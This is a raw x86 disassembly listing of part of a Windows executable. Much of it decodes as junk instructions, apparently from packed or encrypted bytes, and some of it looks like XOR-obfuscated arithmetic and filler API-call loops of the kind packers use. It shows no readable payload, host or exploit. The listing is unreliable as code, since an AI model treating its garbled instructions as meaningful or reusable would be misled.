  40d0c1:	test   BYTE PTR [ecx],bh
  40d0c3:	test   eax,0xf82b0837
  40d0c8:	mov    ebp,0xa7160637
  40d0cd:	stos   BYTE PTR es:[edi],al
  40d0ce:	fild   DWORD PTR [eax+0x34]
  40d0d1:	aam    0xbb
  40d0d3:	add    DWORD PTR [eax],0x8
  40d0d6:	sub    al,0x93
  40d0d8:	pop    eax
  40d0d9:	outs   dx,BYTE PTR ds:[esi]
  40d0da:	sbb    esp,DWORD PTR [edi-0x59f428ec]
  40d0e0:	cmp    dl,BYTE PTR [ecx-0x4d22b5ee]
  40d0e6:	mov    ds:0xa691c764,al
  40d0eb:	mov    ds:0x551d6bb8,al
  40d0f0:	je     0x40d0e6
  40d0f2:	hlt    
  40d0f3:	or     esi,DWORD PTR [eax+0x50]
  40d0f6:	mov    eax,ds:0x42de1050
  40d0fb:	pop    ebx
  40d0fc:	inc    edx
  40d0fd:	push   ecx
  40d0fe:	cmp    BYTE PTR [ebp+0x4b],dh
  40d101:	hlt    
  40d102:	aam    0xb8
  40d104:	add    eax,0x9fdaf72e
  40d109:	sar    BYTE PTR [ecx],0x69
  40d10c:	stc    
  40d10d:	fadd   DWORD PTR [ebx]
  40d10f:	mov    WORD PTR [ebx-0x17],gs
  40d112:	pop    ebx
  40d113:	nop
  40d114:	fstp   DWORD PTR [esi-0x1a]
  40d117:	and    eax,ecx
  40d119:	jae    0x40d17d
  40d11b:	or     DWORD PTR ds:0xeb8f0f77,ebp
  40d121:	cmp    eax,esi
  40d123:	loopne 0x40d186
  40d125:	int    0xb5
  40d127:	es xor eax,0xaa603e3a
  40d12d:	test   DWORD PTR [esi-0x4dbbfe54],edx
  40d133:	shl    BYTE PTR [esi-0x4e],0x76
  40d137:	rcr    DWORD PTR [ebx-0x26791fc],0x72
  40d13e:	ds repnz dec esi
  40d141:	in     al,dx
  40d142:	stc    
  40d143:	jg     0x40d0f8
  40d145:	cmp    al,0x7b
  40d147:	sbb    DWORD PTR [ebx],eax
  40d149:	inc    edx
  40d14a:	lahf   
  40d14b:	out    dx,al
  40d14c:	xchg   ebx,eax
  40d14d:	cwde   
  40d14e:	pop    edx
  40d14f:	jb     0x40d1b2
  40d151:	inc    eax
  40d152:	imul   esp,DWORD PTR [ecx+esi*8-0x2bd14898],0x1f
  40d15a:	cmp    eax,0xbc013618
  40d15f:	js     0x40d121
  40d161:	and    dl,BYTE PTR [esi+0x3e75039b]
  40d167:	xor    esi,edx
  40d169:	add    cl,ah
  40d16b:	push   cs
  40d16c:	xor    bh,BYTE PTR [ebp+0x68a9fff7]
  40d172:	or     al,0x37
  40d174:	aaa    
  40d175:	pop    ds
  40d176:	jmp    0x8b72:0x75668630
  40d17d:	or     al,0xfe
  40d17f:	ja     0x40d1e9
  40d181:	sbb    eax,0x79c2f0d2
  40d186:	dec    ecx
  40d187:	pop    ebx
  40d188:	dec    ebp
  40d189:	sub    DWORD PTR [ebp-0x2fac84c0],0x67
  40d190:	sbb    esi,eax
  40d192:	shr    BYTE PTR [esi-0x53bc076e],0xcb
  40d199:	test   BYTE PTR [edi-0x743cd53a],dl
  40d19f:	cmp    DWORD PTR [esi+0x9734883],edi
  40d1a5:	hlt    
  40d1a6:	repz call 0xb35e:0xf0726242
  40d1ae:	aas    
  40d1af:	clc    
  40d1b0:	and    al,0x32
  40d1b2:	arpl   si,dx
  40d1b4:	stos   BYTE PTR es:[edi],al
  40d1b5:	mov    ch,0x5
  40d1b7:	out    dx,eax
  40d1b8:	adc    DWORD PTR [ecx-0x35],ebx
  40d1bb:	adc    DWORD PTR [eax],esi
  40d1bd:	int3   
  40d1be:	ficomp WORD PTR [eax+0x7caab249]
  40d1c4:	and    al,0xd4
  40d1c6:	cmp    eax,0xce1ed9
  40d1cb:	jmp    0x4026:0xe9b99b43
  40d1d2:	xor    eax,0x6f517e1d
  40d1d7:	inc    edi
  40d1d8:	jge    0x40d165
  40d1da:	and    ax,0xaf1c
  40d1de:	sub    BYTE PTR [edx-0x5e],dh
  40d1e1:	test   DWORD PTR [edi+0x436ce8b6],ecx
  40d1e7:	add    BYTE PTR [eax],al
  40d1e9:	mov    ebp,ss
  40d1eb:	sub    ah,BYTE PTR [edi+0x74]
  40d1ee:	mov    ss,WORD PTR ds:0xc0233c74
  40d1f4:	(bad)  
  40d1f5:	and    ah,BYTE PTR [edx+0x5]
  40d1f8:	popf   
  40d1f9:	popa   
  40d1fa:	inc    edx
  40d1fb:	push   0xffffff96
  40d1fd:	(bad)  
  40d1fe:	in     al,dx
  40d1ff:	scas   al,BYTE PTR es:[edi]
  40d200:	out    0x36,al
  40d202:	hlt    
  40d203:	fnstsw WORD PTR [ebx]
  40d205:	or     al,0x65
  40d207:	mov    cl,0x5b
  40d209:	jmp    0xc2ec:0xf1d7083b
  40d210:	test   eax,0x6d0556c
  40d215:	xor    eax,0xc9e64886
  40d21a:	adc    eax,0x81d86d45
  40d21f:	sti    
  40d220:	mov    bl,0x49
  40d222:	or     al,0x28
  40d224:	dec    edi
  40d225:	xlat   BYTE PTR ds:[ebx]
  40d226:	rcl    BYTE PTR [edx*2+0x5c557780],1
  40d22d:	or     ch,dl
  40d22f:	jno    0x40d233
  40d231:	cmp    al,0xb6
  40d233:	fild   DWORD PTR [edx+0x21f4460]
  40d239:	in     al,dx
  40d23a:	or     esp,esi
  40d23c:	xor    edx,edi
  40d23e:	in     eax,0xb8
  40d240:	jecxz  0x40d290
  40d242:	loop   0x40d215
  40d244:	dec    edx
  40d245:	jle    0x40d252
  40d247:	fwait
  40d248:	dec    ebx
  40d249:	ins    BYTE PTR es:[edi],dx
  40d24a:	inc    edi
  40d24b:	add    bl,BYTE PTR [esp+eax*8]
  40d24e:	sahf   
  40d24f:	dec    eax
  40d250:	(bad)  
  40d251:	in     eax,0x74
  40d253:	or     eax,0xc4438638
  40d258:	xor    BYTE PTR [ebx+0x3f],dh
  40d25b:	test   al,0x91
  40d25d:	xor    ebp,0x56eab210
  40d263:	invd   
  40d265:	mov    bh,0x37
  40d267:	inc    DWORD PTR ds:0xb7640d9f
  40d26d:	retf   
  40d26e:	inc    edi
  40d26f:	(bad)  
  40d270:	mov    ch,0x50
  40d272:	jmp    0x40d2d0
  40d274:	pop    esp
  40d275:	pop    eax
  40d276:	scas   eax,DWORD PTR es:[edi]
  40d277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d278:	int3   
  40d279:	and    DWORD PTR [ebx+0x8],0x95b6505e
  40d280:	mov    eax,0x74e0c5dc
  40d285:	or     cl,BYTE PTR ds:0x76282983
  40d28b:	call   DWORD PTR [edi-0x55]
  40d28e:	into   
  40d28f:	pushf  
  40d290:	jmp    0x73a2:0x49c25cec
  40d297:	sbb    DWORD PTR [edi-0x243b5844],edi
  40d29d:	stc    
  40d29e:	xchg   esp,eax
  40d29f:	and    BYTE PTR [ebp+0x48213644],bh
  40d2a5:	or     ebp,DWORD PTR [edi]
  40d2a7:	push   ss
  40d2a8:	mov    DWORD PTR [ebx+0x23],esi
  40d2ab:	sub    eax,0x6233bbbe
  40d2b0:	pop    ebp
  40d2b1:	pop    eax
  40d2b2:	bound  di,DWORD PTR [esi]
  40d2b5:	aam    0x92
  40d2b7:	aas    
  40d2b8:	jecxz  0x40d2f4
  40d2ba:	sub    edx,DWORD PTR [eax+0x40]
  40d2bd:	cmp    DWORD PTR [edi+0x6ef78d19],0x63704115
  40d2c7:	stc    
  40d2c8:	stc    
  40d2c9:	mov    BYTE PTR [ecx],ah
  40d2cb:	gs sbb al,0xe8
  40d2ce:	jo     0x40d342
  40d2d0:	pop    esp
  40d2d1:	sub    esi,ebx
  40d2d3:	xchg   esi,eax
  40d2d4:	arpl   WORD PTR [esi-0x141bfba0],bp
  40d2da:	cmp    ebp,DWORD PTR [eax+0x78]
  40d2dd:	mov    dh,0xda
  40d2df:	or     ebx,ecx
  40d2e1:	outs   dx,BYTE PTR ds:[esi]
  40d2e2:	jl     0x40d278
  40d2e4:	scas   eax,DWORD PTR es:[edi]
  40d2e5:	jb     0x40d32c
  40d2e7:	ja     0x40d30d
  40d2e9:	scas   eax,DWORD PTR es:[edi]
  40d2ea:	mov    ebx,0x9fc0295
  40d2ef:	test   eax,0x29a387be
  40d2f4:	or     dl,dl
  40d2f6:	pop    ebx
  40d2f7:	xchg   ebp,eax
  40d2f8:	xchg   esp,eax
  40d2f9:	jns    0x40d373
  40d2fb:	pop    ebx
  40d2fc:	and    DWORD PTR [ebp+0x45],ebx
  40d2ff:	fiadd  WORD PTR [esi]
  40d301:	mov    eax,0x5404704
  40d306:	pusha  
  40d307:	and    BYTE PTR [esp+eiz*4],cl
  40d30a:	xlat   BYTE PTR ds:[ebx]
  40d30b:	int    0x43
  40d30d:	arpl   WORD PTR [ebp-0x40dc0e07],sp
  40d313:	add    ah,dl
  40d315:	clc    
  40d316:	inc    esi
  40d317:	pop    eax
  40d318:	fwait
  40d319:	in     al,0x14
  40d31b:	ret    
  40d31c:	sub    al,0x58
  40d31e:	adc    DWORD PTR [eax-0x6cc87775],0x65
  40d325:	jnp    0x40d317
  40d327:	add    BYTE PTR [edi+0x5a],0xe6
  40d32b:	or     BYTE PTR ds:0x56492aec,0x9a
  40d332:	or     eax,0x3fff5c88
  40d337:	jo     0x40d32d
  40d339:	scas   al,BYTE PTR es:[edi]
  40d33a:	and    BYTE PTR [ecx-0x7b1ba2d8],bh
  40d340:	popf   
  40d341:	and    eax,0x5566ad6b
  40d346:	fst    DWORD PTR [edi-0x39]
  40d349:	adc    al,BYTE PTR [edi]
  40d34b:	mov    ebp,0x2254965c
  40d350:	push   esp
  40d351:	aad    0x60
  40d353:	mov    al,0x7c
  40d355:	jl     0x40d305
  40d357:	ss sti 
  40d359:	int    0xb2
  40d35b:	fwait
  40d35c:	push   edx
  40d35d:	pop    edi
  40d35e:	fldenv [ebx-0x6f]
  40d361:	or     al,0xa1
  40d363:	test   ch,dl
  40d365:	xchg   ebx,eax
  40d366:	cmc    
  40d367:	jbe    0x40d325
  40d369:	into   
  40d36a:	popf   
  40d36b:	push   esi
  40d36c:	mov    esp,DWORD PTR [ebx+0x28]
  40d36f:	jl     0x40d305
  40d371:	shr    eax,0x2f
  40d374:	icebp  
  40d375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d377:	fwait
  40d378:	cmp    BYTE PTR [edi-0x52],ah
  40d37b:	push   0x617e003b
  40d380:	not    DWORD PTR [ebx]
  40d382:	mov    eax,ds:0x7d8b47ea
  40d387:	hlt    
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	mov    ch,0x86
  40d3c8:	mov    eax,0x7c986fb3
  40d3cd:	jl     0x40d399
  40d3cf:	jns    0x40d44d
  40d3d1:	jl     0x40d3d0
  40d3d3:	pop    eax
  40d3d4:	inc    esi
  40d3d5:	and    eax,0xd16caaed
  40d3da:	adc    al,0x8b
  40d3dc:	out    dx,al
  40d3dd:	cwde   
  40d3de:	out    dx,eax
  40d3df:	jnp    0x40d3ea
  40d3e1:	and    ebp,DWORD PTR [ebx-0x3372323f]
  40d3e7:	scas   al,BYTE PTR es:[edi]
  40d3e8:	xchg   edx,eax
  40d3e9:	mov    ?,WORD PTR [esi]
  40d3eb:	add    eax,0x9bffba3f
  40d3f0:	fwait
  40d3f1:	stos   BYTE PTR es:[edi],al
  40d3f2:	or     cl,BYTE PTR [edx-0x41]
  40d3f5:	pop    ebp
  40d3f6:	and    BYTE PTR ds:[ebx+0x63],dl
  40d3fa:	push   ss
  40d3fb:	popa   
  40d3fc:	sub    ch,BYTE PTR [eax]
  40d3fe:	mov    edx,0xb9151ef8
  40d403:	stc    
  40d404:	adc    BYTE PTR [ecx],dh
  40d406:	mov    DWORD PTR [ebx+ebx*2],0x320f7517
  40d40d:	sub    DWORD PTR [edx],edi
  40d40f:	lods   al,BYTE PTR ds:[esi]
  40d410:	stos   DWORD PTR es:[edi],eax
  40d411:	out    0x58,al
  40d413:	inc    esi
  40d414:	or     eax,0xc1b83809
  40d419:	cld    
  40d41a:	pop    esi
  40d41b:	cmp    edx,edx
  40d41d:	cmp    dl,ch
  40d41f:	xor    eax,0xef3a4ee1
  40d424:	fisub  DWORD PTR [esi+edi*4]
  40d427:	or     DWORD PTR [esi+0x13],eax
  40d42a:	ret    0x4c0b
  40d42d:	out    0x9b,al
  40d42f:	dec    eax
  40d430:	aam    0x29
  40d432:	jno    0x40d49c
  40d434:	cmp    BYTE PTR [ecx],ah
  40d436:	ja     0x40d41f
  40d438:	cmp    ebp,DWORD PTR es:[eax-0x76]
  40d43c:	call   0x1c59:0xa46c1f62
  40d443:	repnz inc ecx
  40d445:	mov    DWORD PTR [edi],ecx
  40d447:	pop    ecx
  40d448:	shl    ah,cl
  40d44a:	xor    eax,0x5f3aed9d
  40d44f:	adc    edi,DWORD PTR [ecx-0x59]
  40d452:	fcmovnb st,st(4)
  40d454:	pop    eax
  40d455:	aaa    
  40d456:	mov    ds:0xeb5eb3c4,al
  40d45b:	sti    
  40d45c:	cmp    BYTE PTR [eax-0x13],ah
  40d45f:	stos   BYTE PTR es:[edi],al
  40d460:	sar    bh,1
  40d462:	add    DWORD PTR [ecx],esi
  40d464:	and    BYTE PTR [ecx],ah
  40d466:	pop    ds
  40d467:	cdq    
  40d468:	outs   dx,BYTE PTR ds:[esi]
  40d469:	stc    
  40d46a:	xor    ebx,DWORD PTR [esi]
  40d46c:	out    0xd2,eax
  40d46e:	fisttp QWORD PTR [ebx]
  40d470:	xor    DWORD PTR [ecx+0x67],0x70
  40d474:	stc    
  40d475:	jle    0x40d471
  40d477:	push   ebp
  40d478:	jno    0x40d423
  40d47a:	fdivrp st(6),st
  40d47c:	aas    
  40d47d:	cmp    al,0x9f
  40d47f:	mov    edi,0xc90ec300
  40d484:	stos   DWORD PTR es:[edi],eax
  40d485:	imul   esp,edi,0xffffffc1
  40d488:	xchg   esp,eax
  40d489:	mov    cl,0x42
  40d48b:	xor    DWORD PTR [edi-0x5b45b801],0xffffffd0
  40d492:	test   DWORD PTR [edx],ecx
  40d494:	xchg   edx,eax
  40d495:	hlt    
  40d496:	js     0x40d4b6
  40d498:	push   eax
  40d499:	mov    bh,0x2f
  40d49b:	lds    ecx,FWORD PTR [esp+eiz*4]
  40d49e:	data16 jne 0x40d515
  40d4a1:	cs push eax
  40d4a3:	or     BYTE PTR [esi],dl
  40d4a5:	lea    ebx,ds:0x54d7a684
  40d4ab:	pcmpgtb mm5,QWORD PTR [ecx-0x59]
  40d4af:	adc    eax,0xe8ad412f
  40d4b4:	sbb    bh,BYTE PTR ds:0x174337d1
  40d4ba:	add    BYTE PTR [eax-0xc],0x56
  40d4be:	xlat   BYTE PTR ds:[ebx]
  40d4bf:	call   0x3778fd8e
  40d4c4:	ins    BYTE PTR es:[edi],dx
  40d4c5:	addr16 push edi
  40d4c7:	int3   
  40d4c8:	mov    eax,0xb256dced
  40d4cd:	aad    0xcb
  40d4cf:	add    eax,0x88492a34
  40d4d4:	gs fucomi st,st(3)
  40d4d7:	cmp    eax,0xa8b4e2f0
  40d4dc:	and    BYTE PTR [ebp-0x5c4f482b],dh
  40d4e2:	mov    ebx,0xaf77f714
  40d4e7:	loopne 0x40d548
  40d4e9:	cs cmp ah,ch
  40d4ec:	clc    
  40d4ed:	std    
  40d4ee:	arpl   sp,ax
  40d4f0:	scas   eax,DWORD PTR es:[edi]
  40d4f1:	adc    BYTE PTR [ebp+ebp*8-0x15f384a5],cl
  40d4f8:	pop    edx
  40d4f9:	xchg   DWORD PTR [edx],eax
  40d4fb:	sbb    BYTE PTR [edx+0x609ed277],dl
  40d501:	inc    edx
  40d502:	dec    edx
  40d503:	mov    ah,0x25
  40d505:	fld    DWORD PTR [edi+esi*8-0x6f37d0d6]
  40d50c:	mov    ah,0x5a
  40d50e:	mov    ss,WORD PTR [esi+0x1733bea9]
  40d514:	xchg   ecx,eax
  40d515:	add    ebx,0xffffffbc
  40d518:	nop
  40d519:	into   
  40d51a:	add    BYTE PTR [esi],cl
  40d51c:	leave  
  40d51d:	inc    edi
  40d51e:	jne    0x40d52f
  40d520:	mov    bl,0xd4
  40d522:	xor    DWORD PTR [eax-0x2466b943],0x5b
  40d529:	daa    
  40d52a:	dec    esi
  40d52b:	jo     0x40d4bf
  40d52d:	(bad)  
  40d52e:	mov    ss,ebx
  40d530:	adc    DWORD PTR [ebx+0x15],0x5450b00d
  40d537:	push   edi
  40d538:	mov    dh,0x30
  40d53a:	xchg   BYTE PTR [esi+0x1f3ee449],dh
  40d540:	inc    esi
  40d541:	and    BYTE PTR [esi+ecx*4-0x884c2],ch
  40d548:	dec    esi
  40d549:	mov    edx,0x1ff2037
  40d54e:	push   ss
  40d54f:	nop
  40d550:	xor    eax,DWORD PTR gs:[edx+0x38]
  40d554:	ins    DWORD PTR es:[edi],dx
  40d555:	dec    esp
  40d556:	icebp  
  40d557:	and    DWORD PTR [edi-0x5d],eax
  40d55a:	ficomp WORD PTR [ebx-0xbb261b5]
  40d560:	mov    ss,WORD PTR [ebx+0x5e]
  40d563:	sbb    eax,0x4380d0eb
  40d568:	and    al,0x48
  40d56a:	add    BYTE PTR [edi+0x2a9dd432],al
  40d570:	adc    ebp,edi
  40d572:	hlt    
  40d573:	mov    eax,0x94b8a451
  40d578:	mov    DWORD PTR [edi],eax
  40d57a:	fisubr DWORD PTR [esi-0x73439c40]
  40d580:	push   cs
  40d581:	in     eax,0x7
  40d583:	and    BYTE PTR [esi],bh
  40d585:	push   eax
  40d586:	pop    edi
  40d587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d588:	(bad)
  40d58c:	imul   BYTE PTR [ecx-0x37]
  40d58f:	add    BYTE PTR ds:0x7ad33551,dh
  40d595:	call   0x9fd0ed54
  40d59a:	clc    
  40d59b:	addr16 sahf 
  40d59d:	push   es
  40d59e:	cmp    al,0x7e
  40d5a0:	(bad)  
  40d5a1:	cld    
  40d5a2:	sub    al,0x44
  40d5a4:	rdtsc  
  40d5a6:	cmp    al,0x4e
  40d5a8:	cmp    al,0xaf
  40d5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ab:	fadd   st(7),st
  40d5ad:	pop    edx
  40d5ae:	cmp    BYTE PTR [ecx],ch
  40d5b0:	push   edi
  40d5b1:	mov    al,0x2
  40d5b3:	cdq    
  40d5b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5b5:	push   edi
  40d5b6:	inc    esp
  40d5b7:	jmp    0x40d542
  40d5b9:	popa   
  40d5ba:	pop    esp
  40d5bb:	das    
  40d5bc:	aam    0xe6
  40d5be:	shl    DWORD PTR [esp+ecx*8],cl
  40d5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5c2:	adc    BYTE PTR [ebx+0x2db6ae3c],bh
  40d5c8:	cmp    BYTE PTR [ebp-0x66],ch
  40d5cb:	(bad)  
  40d5cc:	stc    
  40d5cd:	push   esp
  40d5ce:	ds out dx,eax
  40d5d0:	inc    esi
  40d5d1:	xchg   DWORD PTR [ebx-0xb],eax
  40d5d4:	in     eax,0x85
  40d5d6:	cmp    bh,dl
  40d5d8:	lahf   
  40d5d9:	mov    eax,ds:0x10514b0
  40d5de:	jns    0x40d622
  40d5e0:	push   edi
  40d5e1:	inc    esp
  40d5e2:	xor    DWORD PTR [eax],0x2e232ac9
  40d5e8:	outs   dx,DWORD PTR ds:[esi]
  40d5e9:	loope  0x40d644
  40d5eb:	daa    
  40d5ec:	(bad)  
  40d5ed:	mov    edx,0xe52f356b
  40d5f2:	stc    
  40d5f3:	and    DWORD PTR ds:[esi-0x50d27873],ecx
  40d5fa:	jp     0x40d67b
  40d5fc:	das    
  40d5fd:	mov    dh,0x86
  40d5ff:	inc    ebx
  40d600:	sub    BYTE PTR [esi],bl
  40d602:	jecxz  0x40d60d
  40d604:	cmc    
  40d605:	in     al,dx
  40d606:	repz cmp BYTE PTR [ebx-0x7c],bl
  40d60a:	xor    DWORD PTR [esi-0x1d379343],edi
  40d610:	mul    BYTE PTR [esi+0x50]
  40d613:	xor    al,0xe0
  40d615:	fcomp  QWORD PTR [edx+ecx*4]
  40d618:	adc    DWORD PTR [esi+eiz*1+0xe],0xffffff91
  40d61d:	ds cmp al,0x95
  40d620:	dec    eax
  40d621:	mov    al,ds:0x552092ee
  40d626:	sti    
  40d627:	jae    0x40d62d
  40d629:	add    bh,0xd4
  40d62c:	cmc    
  40d62d:	jecxz  0x40d5d7
  40d62f:	adc    al,0x94
  40d631:	sub    BYTE PTR [eax-0x3df4c100],dl
  40d637:	fs je  0x40d5dc
  40d63a:	ret    
  40d63b:	ds cs in eax,0x6e
  40d63f:	pop    esi
  40d640:	adc    ah,cl
  40d642:	fnstsw WORD PTR ds:0xb737e197
  40d648:	mov    dh,0xb9
  40d64a:	push   ss
  40d64b:	add    esi,0xfffffffd
  40d64e:	jecxz  0x40d6ce
  40d650:	jge    0x40d5d4
  40d652:	add    BYTE PTR [ebx+0x5a94df16],ah
  40d658:	mov    es,edx
  40d65a:	xchg   esi,eax
  40d65b:	mov    ds:0x9434e86b,eax
  40d660:	out    dx,al
  40d661:	pusha  
  40d662:	test   DWORD PTR [ebx+0x2ec582ba],ecx
  40d668:	pop    ecx
  40d669:	int    0x49
  40d66b:	dec    esp
  40d66c:	pop    ebp
  40d66d:	mov    al,0xf5
  40d66f:	jge    0x40d670
  40d671:	mov    bl,cl
  40d673:	cmp    BYTE PTR ds:0x98ef8570,bh
  40d679:	cs xchg ecx,eax
  40d67b:	mov    dh,BYTE PTR [ecx+0x6e]
  40d67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d67f:	xor    eax,esi
  40d681:	int    0xab
  40d683:	sbb    al,0xd6
  40d685:	repnz pusha 
  40d687:	sub    eax,0x8203b353
  40d68c:	and    BYTE PTR [ebp+0x38],ch
  40d68f:	je     0x40d635
  40d691:	clc    
  40d692:	add    cl,0xf3
  40d695:	push   cs
  40d696:	inc    ebp
  40d697:	adc    al,0x2f
  40d699:	stos   BYTE PTR es:[edi],al
  40d69a:	out    0xeb,al
  40d69c:	ret    
  40d69d:	lods   eax,DWORD PTR ds:[esi]
  40d69e:	retf   
  40d69f:	mov    ah,0x89
  40d6a1:	les    eax,FWORD PTR [eax+0xf]
  40d6a4:	jp     0x40d668
  40d6a6:	cmc    
  40d6a7:	ins    BYTE PTR es:[edi],dx
  40d6a8:	mov    ds:0xe6d1d5fe,eax
  40d6ad:	xchg   ecx,eax
  40d6ae:	in     al,0x2
  40d6b0:	sub    cl,bh
  40d6b2:	icebp  
  40d6b3:	inc    edi
  40d6b4:	jl     0x40d67a
  40d6b6:	inc    ebx
  40d6b7:	outs   dx,BYTE PTR ds:[esi]
  40d6b8:	les    esp,FWORD PTR [esi]
  40d6ba:	or     bh,BYTE PTR [edi+ecx*2+0x4b]
  40d6be:	dec    eax
  40d6bf:	pop    eax
  40d6c0:	hlt    
  40d6c1:	ds pushf 
  40d6c3:	add    bl,BYTE PTR ds:0x18c7830e
  40d6c9:	jle    0x40d708
  40d6cb:	test   BYTE PTR [edi],0x2e
  40d6ce:	and    DWORD PTR [ebx-0x77],esp
  40d6d1:	mov    BYTE PTR [ebx+0x36],dh
  40d6d4:	sub    DWORD PTR [esi-0x50b650b0],0x6f
  40d6db:	and    BYTE PTR [ebx-0x4e3bd04c],0x74
  40d6e2:	mov    ebp,0xf0ba7d01
  40d6e7:	ds icebp 
  40d6e9:	adc    al,dh
  40d6eb:	push   es
  40d6ec:	or     ah,BYTE PTR [ebp+0x5b]
  40d6ef:	scas   eax,DWORD PTR es:[edi]
  40d6f0:	outs   dx,DWORD PTR ds:[esi]
  40d6f1:	in     eax,0x8c
  40d6f3:	and    DWORD PTR [esi*4-0x7f97516a],esi
  40d6fa:	in     eax,dx
  40d6fb:	adc    BYTE PTR [esi],cl
  40d6fd:	mov    ebx,0x521b7c57
  40d702:	jo     0x40d736
  40d704:	fdiv   QWORD PTR [eax]
  40d706:	mul    DWORD PTR [edx]
  40d708:	stos   DWORD PTR es:[edi],eax
  40d709:	jge    0x40d71a
  40d70b:	dec    ecx
  40d70c:	jne    0x40d727
  40d70e:	xor    ah,BYTE PTR [ebx]
  40d710:	or     dh,bh
  40d712:	push   edx
  40d713:	dec    ebx
  40d714:	and    ch,BYTE PTR [edx-0x7f]
  40d717:	mul    DWORD PTR [ebx+0x29]
  40d71a:	xchg   edi,eax
  40d71b:	sub    al,0xcb
  40d71e:	add    DWORD PTR [ebp+0x16],esi
  40d721:	or     DWORD PTR [ebp-0x74],ebx
  40d724:	fdivp  st(5),st
  40d726:	mov    ebp,0x3d033df
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43369b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433663,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43371f,0x4336a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43364b,0x433763
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433723,0x43363f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4336b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4336b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4336b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4336b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4336b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433647,0x433767
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43364f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43364f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43364f,ecx
  40d852:	cmp    DWORD PTR ds:0x43364f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43364f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43364f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43364f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43364f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43371b
  40d8a4:	add    esi,DWORD PTR ds:0x4336e3
  40d8aa:	mov    DWORD PTR ds:0x43371b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433647
  40d8bc:	and    eax,DWORD PTR ds:0x4336af
